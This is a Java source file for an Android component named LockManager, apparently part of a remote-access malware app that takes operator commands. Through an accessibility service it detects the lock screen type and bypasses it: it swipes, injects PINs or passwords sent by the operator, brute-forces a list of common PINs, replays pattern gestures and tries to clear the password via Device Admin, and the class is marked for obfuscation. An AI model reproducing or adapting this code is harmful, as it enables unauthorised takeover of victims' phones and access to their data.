package com.alpha.shield;

import android.accessibilityservice.AccessibilityService;
import android.app.KeyguardManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;
import org.lsposed.lsparanoid.Obfuscate;

import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * LockManager — Alpha.
 *
 * Detects lock screen state and type, then attempts bypass using the best
 * available strategy for the detected type.
 *
 * Lock type detection:
 *   - KeyguardManager.isKeyguardLocked() / isKeyguardSecure()
 *   - Accessibility window inspection: finds systemui/keyguard windows and
 *     classifies the first interactive node (PIN field, pattern view, etc.)
 *
 * Unlock strategies (tried in order):
 *   1. NONE / SWIPE: single swipe-up gesture — fastest path.
 *   2. PIN: wakes screen, waits for PIN keypad, injects digits via ACTION_SET_TEXT,
 *      then presses OK/Enter. Tries PIN from operator command args first;
 *      falls back to common PINs [1234, 0000, 1111, 0000, 2580, 1212, 1122]
 *      only when operator explicitly requests bruteforce mode.
 *   3. PATTERN: injects a sequence of SWIPE gestures through the pattern dot coords
 *      extracted by LyBridge, or sends pre-drawn path from operator.
 *   4. DEVICE ADMIN: DevicePolicyManager.resetPassword (API ≤ 25) or
 *      setResetPasswordToken (API 26+). Only available if the app holds Device Owner
 *      or Profile Owner rights — opportunistic attempt.
 *
 * "Press Unlock from any app":
 *   Operator sends AUTO_UNLOCK → unlockNow(). If screen is off, wake first.
 *   Then detect and dispatch best strategy. Result reported via callback.
 */
@Obfuscate
public class LockManager {

    private static final String TAG = "LockMgr";

    public enum LockType { NONE, SWIPE, PIN, PATTERN, PASSWORD, BIOMETRIC, UNKNOWN }

    public interface Callback {
        void onLockStatus(String json);
        void onUnlockResult(boolean success, String detail);
    }

    private final AccessibilityService service;
    private final GestureCore          gestures;
    private final Callback             callback;
    private final ExecutorService      exec = Executors.newSingleThreadExecutor();
    private final Handler              main = new Handler(Looper.getMainLooper());

    public LockManager(AccessibilityService service,
                       GestureCore gestures,
                       Callback callback) {
        this.service   = service;
        this.gestures  = gestures;
        this.callback  = callback;
    }

    // ── Status ────────────────────────────────────────────────────────────────

    public void getStatus() {
        exec.submit(() -> {
            try {
                KeyguardManager km = (KeyguardManager)
                        service.getSystemService(Context.KEYGUARD_SERVICE);
                PowerManager pm = (PowerManager)
                        service.getSystemService(Context.POWER_SERVICE);

                boolean locked   = km != null && km.isKeyguardLocked();
                boolean secure   = km != null && km.isKeyguardSecure();
                boolean screenOn = pm != null && pm.isInteractive();
                LockType type    = detectLockType(km, locked, secure);

                JSONObject obj = new JSONObject();
                obj.put("locked",   locked);
                obj.put("secure",   secure);
                obj.put("screenOn", screenOn);
                obj.put("type",     type.name());
                callback.onLockStatus(obj.toString());
            } catch (Exception e) {
                Log.e(TAG, "getStatus: " + e.getMessage());
            }
        });
    }

    // ── Auto-unlock ────────────────────────────────────────────────────────────

    /**
     * Main entry point. Wakes screen if needed, detects lock type, tries best strategy.
     * @param pin   optional PIN from operator (null = try common PINs)
     * @param pattern optional pattern path JSON array (null = not provided)
     * @param bruteforce true = try common PINs when pin is null
     */
    public void unlockNow(String pin, String pattern, boolean bruteforce) {
        exec.submit(() -> {
            try {
                // Step 1: ensure screen is on
                wakeScreenIfOff();
                Thread.sleep(600);

                KeyguardManager km = (KeyguardManager)
                        service.getSystemService(Context.KEYGUARD_SERVICE);
                if (km == null || !km.isKeyguardLocked()) {
                    callback.onUnlockResult(true, "already unlocked");
                    return;
                }

                boolean secure = km.isKeyguardSecure();
                LockType type  = detectLockType(km, true, secure);
                Log.d(TAG, "unlock: type=" + type);

                switch (type) {
                    case NONE:
                    case SWIPE:
                        unlockSwipe();
                        break;
                    case PIN:
                        unlockPin(pin, bruteforce);
                        break;
                    case PATTERN:
                        unlockPattern(pattern);
                        break;
                    case PASSWORD:
                        unlockPassword(pin);
                        break;
                    case BIOMETRIC:
                        // Try swipe first (many biometric locks have swipe bypass)
                        unlockSwipe();
                        break;
                    default:
                        unlockSwipe(); // best-effort on unknown
                }
            } catch (Exception e) {
                callback.onUnlockResult(false, e.getMessage());
            }
        });
    }

    // ── Lock type detection ────────────────────────────────────────────────────

    private LockType detectLockType(KeyguardManager km, boolean locked, boolean secure) {
        if (!locked) return LockType.NONE;
        if (!secure) return LockType.SWIPE;

        // Inspect the accessibility window for keyguard/systemui content
        try {
            AccessibilityNodeInfo root = service.getRootInActiveWindow();
            if (root == null) return LockType.UNKNOWN;
            LockType detected = inspectRootForLockType(root);
            root.recycle();
            if (detected != LockType.UNKNOWN) return detected;
        } catch (Exception ignored) {}

        return LockType.UNKNOWN;
    }

    private LockType inspectRootForLockType(AccessibilityNodeInfo root) {
        // Walk the tree looking for telltale nodes
        return walkForLockType(root, 0);
    }

    private LockType walkForLockType(AccessibilityNodeInfo node, int depth) {
        if (node == null || depth > 8) return LockType.UNKNOWN;

        String cls  = safeClass(node);
        String res  = safeId(node);
        String text = safeText(node);

        // PIN: KeyguardPINView, pin input field
        if (cls.contains("PINView") || cls.contains("PinView")
                || res.contains("pin") || cls.contains("PasswordNumeric")) {
            return LockType.PIN;
        }

        // Pattern: KeyguardPatternView, LockPatternView
        if (cls.contains("PatternView") || cls.contains("LockPattern")
                || res.contains("pattern")) {
            return LockType.PATTERN;
        }

        // Password: KeyguardPasswordView
        if (cls.contains("PasswordView") || cls.contains("KeyguardPassword")) {
            return LockType.PASSWORD;
        }

        // Biometric: usually shows a fingerprint icon
        if (res.contains("fingerprint") || res.contains("biometric")
                || text.toLowerCase().contains("fingerprint")
                || text.toLowerCase().contains("face unlock")) {
            return LockType.BIOMETRIC;
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            LockType t = walkForLockType(child, depth + 1);
            if (child != null) child.recycle();
            if (t != LockType.UNKNOWN) return t;
        }
        return LockType.UNKNOWN;
    }

    // ── Strategy: SWIPE ───────────────────────────────────────────────────────

    private void unlockSwipe() throws InterruptedException {
        gestures.swipeUpToUnlock();
        Thread.sleep(600);
        // Check if still locked
        KeyguardManager km = (KeyguardManager)
                service.getSystemService(Context.KEYGUARD_SERVICE);
        boolean stillLocked = km != null && km.isKeyguardLocked();
        callback.onUnlockResult(!stillLocked, stillLocked ? "swipe insufficient" : "swiped");
    }

    // ── Strategy: PIN ─────────────────────────────────────────────────────────

    private void unlockPin(String pin, boolean bruteforce) throws InterruptedException {
        // Try provided PIN first
        if (pin != null && !pin.isEmpty()) {
            boolean ok = tryPin(pin);
            if (ok) { callback.onUnlockResult(true, "pin injected: " + pin); return; }
        }

        if (!bruteforce) {
            callback.onUnlockResult(false, "pin not provided and bruteforce disabled");
            return;
        }

        // Common PINs brute-force (operator explicitly enabled this)
        String[] common = {"1234", "0000", "1111", "2222", "3333", "4444",
                           "5555", "6666", "7777", "8888", "9999",
                           "1212", "1122", "2580", "0852", "2468", "1357"};
        for (String attempt : common) {
            boolean ok = tryPin(attempt);
            if (ok) { callback.onUnlockResult(true, "pin found: " + attempt); return; }
            Thread.sleep(300);
        }
        callback.onUnlockResult(false, "pin brute-force exhausted");
    }

    private boolean tryPin(String pin) throws InterruptedException {
        // Find PIN input field
        AccessibilityNodeInfo root = service.getRootInActiveWindow();
        if (root == null) return false;

        // Try direct text injection into PIN field
        AccessibilityNodeInfo pinField = findNodeByClass(root, "PINView", "PinView",
                "PasswordNumeric", "EditText");
        if (pinField != null && pinField.isEditable()) {
            android.os.Bundle b = new android.os.Bundle();
            b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, pin);
            pinField.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
            pinField.performAction(0x01000016 /* ACTION_IME_ENTER — compat constant, not on platform class */);
            pinField.recycle();
            root.recycle();
            Thread.sleep(800);
        } else {
            // Tap each digit button individually
            if (pinField != null) pinField.recycle();
            root.recycle();
            for (char digit : pin.toCharArray()) {
                clickDigitButton(String.valueOf(digit));
                Thread.sleep(80);
            }
            clickDigitButton("OK", "Enter", "→");
            Thread.sleep(600);
        }

        // Check if unlocked
        KeyguardManager km = (KeyguardManager)
                service.getSystemService(Context.KEYGUARD_SERVICE);
        return km == null || !km.isKeyguardLocked();
    }

    private void clickDigitButton(String... labels) {
        AccessibilityNodeInfo root = service.getRootInActiveWindow();
        if (root == null) return;
        for (String label : labels) {
            List<AccessibilityNodeInfo> nodes =
                    root.findAccessibilityNodeInfosByText(label);
            for (AccessibilityNodeInfo n : nodes) {
                if (n.isClickable() && n.isEnabled()) {
                    n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    n.recycle();
                    root.recycle();
                    return;
                }
                n.recycle();
            }
        }
        root.recycle();
    }

    // ── Strategy: PATTERN ─────────────────────────────────────────────────────

    private void unlockPattern(String patternJson) throws InterruptedException {
        if (patternJson != null && !patternJson.isEmpty()) {
            try {
                org.json.JSONArray path = new org.json.JSONArray(patternJson);
                gestures.pathGesture(path);
                Thread.sleep(800);
                KeyguardManager km = (KeyguardManager)
                        service.getSystemService(Context.KEYGUARD_SERVICE);
                boolean still = km != null && km.isKeyguardLocked();
                callback.onUnlockResult(!still, still ? "pattern failed" : "pattern applied");
                return;
            } catch (Exception e) {
                Log.e(TAG, "pattern parse: " + e.getMessage());
            }
        }
        // No pattern provided — fall back to swipe
        unlockSwipe();
    }

    // ── Strategy: PASSWORD ────────────────────────────────────────────────────

    private void unlockPassword(String password) throws InterruptedException {
        if (password == null || password.isEmpty()) {
            callback.onUnlockResult(false, "no password provided");
            return;
        }
        // Find password EditText and inject
        AccessibilityNodeInfo root = service.getRootInActiveWindow();
        if (root == null) { callback.onUnlockResult(false, "no window"); return; }
        AccessibilityNodeInfo field = findEditable(root);
        if (field != null) {
            android.os.Bundle b = new android.os.Bundle();
            b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, password);
            field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
            field.performAction(0x01000016 /* ACTION_IME_ENTER — compat constant, not on platform class */);
            field.recycle();
        }
        root.recycle();
        Thread.sleep(800);
        KeyguardManager km = (KeyguardManager)
                service.getSystemService(Context.KEYGUARD_SERVICE);
        boolean still = km != null && km.isKeyguardLocked();
        callback.onUnlockResult(!still, still ? "password failed" : "password injected");
    }

    // ── Device Admin path ─────────────────────────────────────────────────────

    /**
     * Attempts DevicePolicyManager.resetPassword("", 0) if device admin is active.
     * On API 26+ this is a no-op unless the app is device owner.
     * Returns true if the call was possible.
     */
    public boolean tryDeviceAdminClearPassword() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager)
                    service.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComp = new ComponentName(service,
                    MyAdminReceiver.class);
            if (dpm != null && dpm.isAdminActive(adminComp)) {
                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
                    //noinspection deprecation
                    dpm.resetPassword("", DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
                    return true;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "deviceAdmin: " + e.getMessage());
        }
        return false;
    }

    // ── Wake screen ───────────────────────────────────────────────────────────

    private void wakeScreenIfOff() {
        try {
            PowerManager pm = (PowerManager) service.getSystemService(Context.POWER_SERVICE);
            if (pm != null && !pm.isInteractive()) {
                PowerManager.WakeLock wl = pm.newWakeLock(
                        PowerManager.SCREEN_BRIGHT_WAKE_LOCK
                                | PowerManager.ACQUIRE_CAUSES_WAKEUP
                                | PowerManager.ON_AFTER_RELEASE,
                        "alpha:unlock");
                wl.acquire(3000);
                wl.release();
            }
        } catch (Exception e) {
            Log.e(TAG, "wakeScreen: " + e.getMessage());
        }
    }

    // ── Node helpers ──────────────────────────────────────────────────────────

    private AccessibilityNodeInfo findNodeByClass(AccessibilityNodeInfo root,
                                                   String... classSubstrings) {
        return walkForClass(root, 0, classSubstrings);
    }

    private AccessibilityNodeInfo walkForClass(AccessibilityNodeInfo node, int depth,
                                               String... subs) {
        if (node == null || depth > 10) return null;
        String cls = safeClass(node);
        for (String s : subs) {
            if (cls.contains(s)) return node;
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            AccessibilityNodeInfo found = walkForClass(child, depth + 1, subs);
            if (found != null) {
                if (found != child && child != null) child.recycle();
                return found;
            }
            if (child != null) child.recycle();
        }
        return null;
    }

    private AccessibilityNodeInfo findEditable(AccessibilityNodeInfo node) {
        if (node == null) return null;
        if (node.isEditable()) return node;
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            AccessibilityNodeInfo res = findEditable(child);
            if (res != null) {
                if (res != child && child != null) child.recycle();
                return res;
            }
            if (child != null) child.recycle();
        }
        return null;
    }

    private String safeClass(AccessibilityNodeInfo n) {
        CharSequence c = n.getClassName();
        return c != null ? c.toString() : "";
    }

    private String safeId(AccessibilityNodeInfo n) {
        String id = n.getViewIdResourceName();
        return id != null ? id.toLowerCase() : "";
    }

    private String safeText(AccessibilityNodeInfo n) {
        CharSequence t = n.getText();
        return t != null ? t.toString() : "";
    }

    // Placeholder - actual class defined in APK
    private static class MyAdminReceiver extends android.app.admin.DeviceAdminReceiver {}
}
